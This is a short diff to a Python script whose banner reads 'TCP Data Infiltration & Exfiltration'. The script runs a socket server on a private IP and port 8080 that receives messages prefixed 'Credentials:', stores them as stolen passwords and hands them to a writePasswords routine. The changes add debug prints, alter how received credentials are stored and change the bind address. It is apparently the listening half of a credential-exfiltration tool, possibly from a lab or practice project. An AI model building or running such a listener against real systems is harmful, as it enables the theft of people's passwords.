@@ -55,9 +55,14 @@ def receivePasswords(conn):
         data = conn.recv(5000).decode()
         if data.startswith('Credentials:'):
             credentials = data.split("Credentials:")[1]
-            passwords.append(credentials.split(','))
+            passwords.append(credentials)
+            print('in if statement')
+            for x in passwords:
+                print(x)
+            break
         else:
             break
+    print('bout to  write')
     writePasswords(conn, passwords)
 
 
@@ -70,7 +75,7 @@ def writePasswords(conn, credentials):
 def connect():
     s = socket.socket()
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("192.168.21.2", 8080))  # Change the IP Address to fit your script
+    s.bind(("192.168.21.128", 8080))  # Change the IP Address to fit your script
     s.listen(1)
     print("=" * 60)
     print("TCP Data Infiltration & Exfiltration")
